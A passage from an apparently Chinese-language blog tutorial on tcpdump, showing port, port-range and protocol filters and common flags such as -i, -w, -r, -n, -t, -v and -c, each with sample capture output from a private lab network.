IP 192.168.1.68 &gt; webb: ICMP host 192.168.1.3 unreachable, length 92</span><br><span class="line">20 packets captured</span><br><span class="line">20 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="过滤某个端口或某个范围端口数据包"><a href="#过滤某个端口或某个范围端口数据包" class="headerlink" title="过滤某个端口或某个范围端口数据包"></a>过滤某个端口或某个范围端口数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump port 80 / tcpdump port http / tcpdump portrange 8080-8888</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">...</span><br><span class="line">15:51:32.684946 IP webb.56630 &gt; gw.gcableconfig.local.http: Flags [.], ack 1, win 64240, length 0</span><br><span class="line">15:51:32.685142 IP webb.56630 &gt; gw.gcableconfig.local.http: Flags [P.], <span class="built_in">seq</span> 1:76, ack 1, win 64240, length 75: HTTP: GET / HTTP/1.1</span><br><span class="line">15:51:32.685408 IP gw.gcableconfig.local.http &gt; webb.56630: Flags [.], ack 76, win 64240, length 0</span><br><span class="line">15:51:32.688526 IP gw.gcableconfig.local.http &gt; webb.56630: Flags [P.], <span class="built_in">seq</span> 1:2897, ack 76, win 64240, length 2896: HTTP: HTTP/1.0 200 OK</span><br><span class="line">15:51:32.688618 IP webb.56630 &gt; gw.gcableconfig.local.http: Flags [.], ack 2897, win 62780, length 0</span><br><span class="line">15:51:32.696002 IP gw.gcableconfig.local.http &gt; webb.56630: Flags [FP.], <span class="built_in">seq</span> 2897:5303, ack 76, win 64240, length 2406: HTTP</span><br><span class="line">...</span><br><span class="line">17 packets captured</span><br><span class="line">17 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="过滤某个协议数据包"><a href="#过滤某个协议数据包" class="headerlink" title="过滤某个协议数据包"></a>过滤某个协议数据包</h3><p>不能过滤应用层协议。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump icmp</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">15:59:40.866349 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 12, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:59:40.884372 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 12, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">15:59:41.868101 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 12, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:59:41.870006 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 12, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">15:59:42.868916 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 12, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">15:59:42.874483 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 12, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">6 packets captured</span><br><span class="line">6 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h2 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h2><h3 id="i-监听网卡"><a href="#i-监听网卡" class="headerlink" title="-i 监听网卡"></a>-i 监听网卡</h3><table><thead><tr><th>用法</th><th>说明</th></tr></thead><tbody><tr><td>-i ens32</td><td>监听某块网卡</td></tr><tr><td>-i any</td><td>监听所有网卡</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -i ens32</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:05:23.250173 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1004681477:1004681593, ack 3034329096, win 501, options [nop,nop,TS val 3746598079 ecr 548293704], length 116</span><br><span class="line">16:05:23.250277 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 116, win 1056, options [nop,nop,TS val 548293754 ecr 3746598079], length 0</span><br><span class="line">16:05:23.250300 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 116:152, ack 1, win 501, options [nop,nop,TS val 3746598080 ecr 548293704], length 36</span><br><span class="line">...</span><br><span class="line">7884 packets captured</span><br><span class="line">8045 packets received by filter</span><br><span class="line">161 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="w-将捕获的数据包保存到文件"><a href="#w-将捕获的数据包保存到文件" class="headerlink" title="-w 将捕获的数据包保存到文件"></a>-w 将捕获的数据包保存到文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -w filename.pcap</span></span><br><span class="line">tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">6 packets captured</span><br><span class="line">6 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line"></span><br><span class="line">root@webb:~<span class="comment"># file filename.pcap </span></span><br><span class="line">filename.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)</span><br><span class="line"></span><br><span class="line">root@webb:~<span class="comment"># ls -lh filename.pcap</span></span><br><span class="line">-rw-r--r-- 1 tcpdump tcpdump 708 Jul 19 16:11 filename.pcap</span><br></pre></td></tr></table></figure><h3 id="r-从文件中读取数据包"><a href="#r-从文件中读取数据包" class="headerlink" title="-r 从文件中读取数据包"></a>-r 从文件中读取数据包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -r filename.pcap </span></span><br><span class="line">reading from file filename.pcap, link-type EN10MB (Ethernet)</span><br><span class="line">16:11:35.279466 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 13, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">16:11:35.281550 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 13, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">16:11:36.302235 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 13, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">16:11:36.330271 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 13, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">16:11:37.296484 IP webb &gt; gw.gcableconfig.local: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 13, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">16:11:37.299137 IP gw.gcableconfig.local &gt; webb: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 13, <span class="built_in">seq</span> 3, length 64</span><br></pre></td></tr></table></figure><h3 id="n-不把IP地址转化为主机名，直接显示IP地址。"><a href="#n-不把IP地址转化为主机名，直接显示IP地址。" class="headerlink" title="-n 不把IP地址转化为主机名，直接显示IP地址。"></a>-n 不把IP地址转化为主机名，直接显示IP地址。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -n</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:17:49.617171 IP 192.168.111.129 &gt; 192.168.1.1: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 14, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">16:17:49.619181 IP 192.168.1.1 &gt; 192.168.111.129: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 14, <span class="built_in">seq</span> 1, length 64</span><br><span class="line">16:17:50.703854 IP 192.168.111.129 &gt; 192.168.1.1: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 14, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">16:17:50.734139 IP 192.168.1.1 &gt; 192.168.111.129: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 14, <span class="built_in">seq</span> 2, length 64</span><br><span class="line">16:17:51.679695 IP 192.168.111.129 &gt; 192.168.1.1: ICMP <span class="built_in">echo</span> request, <span class="built_in">id</span> 14, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">16:17:51.690580 IP 192.168.1.1 &gt; 192.168.111.129: ICMP <span class="built_in">echo</span> reply, <span class="built_in">id</span> 14, <span class="built_in">seq</span> 3, length 64</span><br><span class="line">6 packets captured</span><br><span class="line">6 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="nn-不把IP地址转化为主机名和不把端口号转换成协议，直接显示IP地址和端口号。"><a href="#nn-不把IP地址转化为主机名和不把端口号转换成协议，直接显示IP地址和端口号。" class="headerlink" title="-nn 不把IP地址转化为主机名和不把端口号转换成协议，直接显示IP地址和端口号。"></a>-nn 不把IP地址转化为主机名和不把端口号转换成协议，直接显示IP地址和端口号。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -nn</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:20:44.830171 IP 192.168.111.129.22 &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1006131257:1006131453, ack 3034339648, win 501, options [nop,nop,TS val 3747519659 ecr 549215216], length 196</span><br><span class="line">16:20:44.830292 IP 192.168.111.1.43116 &gt; 192.168.111.129.22: Flags [.], ack 196, win 1056, options [nop,nop,TS val 549215281 ecr 3747519659], length 0</span><br><span class="line">16:20:44.830478 IP 192.168.111.129.22 &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 196:584, ack 1, win 501, options [nop,nop,TS val 3747519660 ecr 549215281], length 388</span><br><span class="line">16:20:44.830627 IP 192.168.111.1.43116 &gt; 192.168.111.129.22: Flags [.], ack 584, win 1056, options [nop,nop,TS val 549215281 ecr 3747519660], length 0</span><br><span class="line">...</span><br><span class="line">2550 packets captured</span><br><span class="line">2552 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="N-只显示host或域名开头部分（192-ssh-x3D-192-168-1-1-ssh）。"><a href="#N-只显示host或域名开头部分（192-ssh-x3D-192-168-1-1-ssh）。" class="headerlink" title="-N 只显示host或域名开头部分（192.ssh&#x3D;192.168.1.1.ssh）。"></a>-N 只显示host或域名开头部分（192.ssh&#x3D;192.168.1.1.ssh）。</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -N</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:23:15.312084 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1006622321:1006622437, ack 3034339996, win 501, options [nop,nop,TS val 3747670141 ecr 549365686], length 116</span><br><span class="line">16:23:15.312187 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 116, win 3446, options [nop,nop,TS val 549365757 ecr 3747670141], length 0</span><br><span class="line">16:23:15.312200 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 116:152, ack 1, win 501, options [nop,nop,TS val 3747670142 ecr 549365686], length 36</span><br><span class="line">16:23:15.312258 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 152, win 3446, options [nop,nop,TS val 549365757 ecr 3747670142], length 0</span><br><span class="line">...</span><br><span class="line">658 packets captured</span><br><span class="line">825 packets received by filter</span><br><span class="line">161 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="t-每行不输出时间"><a href="#t-每行不输出时间" class="headerlink" title="-t 每行不输出时间"></a>-t 每行不输出时间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -t</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1006738817:1006738933, ack 3034340408, win 501, options [nop,nop,TS val 3747773458 ecr 549468995], length 116</span><br><span class="line">IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 116, win 3446, options [nop,nop,TS val 549469070 ecr 3747773458], length 0</span><br><span class="line">IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 116:152, ack 1, win 501, options [nop,nop,TS val 3747773458 ecr 549469070], length 36</span><br><span class="line">IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 152, win 3446, options [nop,nop,TS val 549469070 ecr 3747773458], length 0</span><br><span class="line">...</span><br><span class="line">1049 packets captured</span><br><span class="line">1176 packets received by filter</span><br><span class="line">96 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="tt-每行输出时间戳"><a href="#tt-每行输出时间戳" class="headerlink" title="-tt 每行输出时间戳"></a>-tt 每行输出时间戳</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -tt</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">1658248690.215415 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1006906525:1006906721, ack 3034341024, win 501, options [nop,nop,TS val 3748565045 ecr 550260577], length 196</span><br><span class="line">1658248690.215543 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 196, win 3446, options [nop,nop,TS val 550260641 ecr 3748565045], length 0</span><br><span class="line">1658248690.249773 IP kazooie.canonical.com.http &gt; webb.60558: Flags [P.], <span class="built_in">seq</span> 4222572013:4222573441, ack 3325110471, win 64240, length 1428: HTTP</span><br><span class="line">1658248690.249834 IP webb.60558 &gt; kazooie.canonical.com.http: Flags [.], ack 1428, win 65535, length 0</span><br><span class="line">1658248690.278397 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 196:568, ack 1, win 501, options [nop,nop,TS val 3748565108 ecr 550260641], length 372</span><br><span class="line">...</span><br><span class="line">1583 packets captured</span><br><span class="line">1587 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="ttt-每两行输出时间戳"><a href="#ttt-每两行输出时间戳" class="headerlink" title="-ttt 每两行输出时间戳"></a>-ttt 每两行输出时间戳</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -ttt</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line"> 00:00:00.000000 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1007674849:1007675045, ack 3034341740, win 501, options [nop,nop,TS val 3748642834 ecr 550337390], length 196</span><br><span class="line"> 00:00:00.000438 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 196, win 3446, options [nop,nop,TS val 550338430 ecr 3748642834], length 0</span><br><span class="line"> 00:00:00.008378 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 196:232, ack 1, win 501, options [nop,nop,TS val 3748642843 ecr 550338430], length 36</span><br><span class="line"> 00:00:00.000311 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 232, win 3446, options [nop,nop,TS val 550338439 ecr 3748642843], length 0</span><br><span class="line"> ...</span><br><span class="line">1063 packets captured</span><br><span class="line">1068 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="tttt-输出日期时间"><a href="#tttt-输出日期时间" class="headerlink" title="-tttt 输出日期时间"></a>-tttt 输出日期时间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -tttt</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">2022-07-19 16:41:04.792018 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1007865805:1007866001, ack 3034341928, win 501, options [nop,nop,TS val 3748739621 ecr 550435157], length 196</span><br><span class="line">2022-07-19 16:41:04.792158 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 196, win 3446, options [nop,nop,TS val 550435216 ecr 3748739621], length 0</span><br><span class="line">2022-07-19 16:41:04.895337 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 196:584, ack 1, win 501, options [nop,nop,TS val 3748739725 ecr 550435216], length 388</span><br><span class="line">2022-07-19 16:41:04.895583 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 584, win 3446, options [nop,nop,TS val 550435319 ecr 3748739725], length 0</span><br><span class="line">...</span><br><span class="line">2184 packets captured</span><br><span class="line">2187 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="v-输出详细的信息（TTL，ID标识…）"><a href="#v-输出详细的信息（TTL，ID标识…）" class="headerlink" title="-v 输出详细的信息（TTL，ID标识…）"></a>-v 输出详细的信息（TTL，ID标识…）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -v</span></span><br><span class="line">tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:43:43.939027 IP (tos 0x10, ttl 64, <span class="built_in">id</span> 23830, offset 0, flags [DF], proto TCP (6), length 184)</span><br><span class="line">    webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">cksum</span> 0x607e (incorrect -&gt; 0xf338), <span class="built_in">seq</span> 1008299485:1008299617, ack 3034342512, win 501, options [nop,nop,TS val 3748898768 ecr 550594296], length 132</span><br><span class="line">16:43:43.939166 IP (tos 0x0, ttl 64, <span class="built_in">id</span> 27031, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    192.168.111.1.43116 &gt; webb.ssh: Flags [.], <span class="built_in">cksum</span> 0x8ddc (correct), ack 132, win 3446, options [nop,nop,TS val 550594359 ecr 3748898768], length 0</span><br><span class="line">16:43:43.939182 IP (tos 0x10, ttl 64, <span class="built_in">id</span> 23831, offset 0, flags [DF], proto TCP (6), length 184)</span><br><span class="line">    webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">cksum</span> 0x607e (incorrect -&gt; 0xa60c), <span class="built_in">seq</span> 132:264, ack 1, win 501, options [nop,nop,TS val 3748898768 ecr 550594296], length 132</span><br><span class="line">...</span><br><span class="line">4815 packets captured</span><br><span class="line">5238 packets received by filter</span><br><span class="line">420 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="vv-显示比-v更多的信息（NFS回应包中的附加域，SMB数据包会完全解码）"><a href="#vv-显示比-v更多的信息（NFS回应包中的附加域，SMB数据包会完全解码）" class="headerlink" title="-vv 显示比-v更多的信息（NFS回应包中的附加域，SMB数据包会完全解码）"></a>-vv 显示比-v更多的信息（NFS回应包中的附加域，SMB数据包会完全解码）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -vv</span></span><br><span class="line">tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:44:22.612405 IP (tos 0x10, ttl 64, <span class="built_in">id</span> 26920, offset 0, flags [DF], proto TCP (6), length 184)</span><br><span class="line">    webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">cksum</span> 0x607e (incorrect -&gt; 0x2bbc), <span class="built_in">seq</span> 1009762505:1009762637, ack 3034342880, win 501, options [nop,nop,TS val 3748937442 ecr 550632388], length 132</span><br><span class="line">16:44:22.613047 IP (tos 0x0, ttl 64, <span class="built_in">id</span> 29220, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    192.168.111.1.43116 &gt; webb.ssh: Flags [.], <span class="built_in">cksum</span> 0x0b49 (correct), <span class="built_in">seq</span> 1, ack 132, win 3446, options [nop,nop,TS val 550633029 ecr 3748937442], length 0</span><br><span class="line">16:44:22.614194 IP (tos 0x10, ttl 64, <span class="built_in">id</span> 26921, offset 0, flags [DF], proto TCP (6), length 184)</span><br><span class="line">    webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">cksum</span> 0x607e (incorrect -&gt; 0x546b), <span class="built_in">seq</span> 132:264, ack 1, win 501, options [nop,nop,TS val 3748937443 ecr 550633029], length 132</span><br><span class="line">...</span><br><span class="line">1006 packets captured</span><br><span class="line">1013 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="vvv-显示比-vv更多的信息（telnet使用的SB，SE选项会被打印）"><a href="#vvv-显示比-vv更多的信息（telnet使用的SB，SE选项会被打印）" class="headerlink" title="-vvv 显示比-vv更多的信息（telnet使用的SB，SE选项会被打印）"></a>-vvv 显示比-vv更多的信息（telnet使用的SB，SE选项会被打印）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -vvv</span></span><br><span class="line">tcpdump: listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:44:59.706570 IP (tos 0x10, ttl 64, <span class="built_in">id</span> 27541, offset 0, flags [DF], proto TCP (6), length 104)</span><br><span class="line">    webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">cksum</span> 0x602e (incorrect -&gt; 0xaad1), <span class="built_in">seq</span> 1010065545:1010065597, ack 3034343176, win 501, options [nop,nop,TS val 3748974536 ecr 550670053], length 52</span><br><span class="line">16:44:59.706685 IP (tos 0x10, ttl 64, <span class="built_in">id</span> 27542, offset 0, flags [DF], proto TCP (6), length 168)</span><br><span class="line">    webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">cksum</span> 0x606e (incorrect -&gt; 0xf794), <span class="built_in">seq</span> 52:168, ack 1, win 501, options [nop,nop,TS val 3748974536 ecr 550670053], length 116</span><br><span class="line">16:44:59.706729 IP (tos 0x0, ttl 64, <span class="built_in">id</span> 29641, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    192.168.111.1.43116 &gt; webb.ssh: Flags [.], <span class="built_in">cksum</span> 0x48e2 (correct), <span class="built_in">seq</span> 1, ack 52, win 3446, options [nop,nop,TS val 550670120 ecr 3748974536], length 0</span><br><span class="line">16:44:59.706730 IP (tos 0x0, ttl 64, <span class="built_in">id</span> 29642, offset 0, flags [DF], proto TCP (6), length 52)</span><br><span class="line">    192.168.111.1.43116 &gt; webb.ssh: Flags [.], <span class="built_in">cksum</span> 0x486e (correct), <span class="built_in">seq</span> 1, ack 168, win 3446, options [nop,nop,TS val 550670120 ecr 3748974536], length 0</span><br><span class="line">...</span><br><span class="line">1200 packets captured</span><br><span class="line">1352 packets received by filter</span><br><span class="line">151 packets dropped by kernel</span><br></pre></td></tr></table></figure><h3 id="c-限制数据包次数"><a href="#c-限制数据包次数" class="headerlink" title="-c 限制数据包次数"></a>-c 限制数据包次数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@webb:~<span class="comment"># tcpdump -c 20</span></span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on ens32, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">16:52:01.575503 IP webb.ssh &gt; 192.168.111.1.43116: Flags [P.], <span class="built_in">seq</span> 1010430833:1010431029, ack 3034344492, win 501, options [nop,nop,TS val 3749396405 ecr 551091899], length 196</span><br><span class="line">16:52:01.575643 IP 192.168.111.1.43116 &gt; webb.ssh: Flags [.], ack 196, win 3446, options [nop,nop,TS val 551091961 ecr 3749396405], length 0</span><br><span class="line">16:52:01.630839 IP webb.ssh &gt; 192.168.111.1.43116: 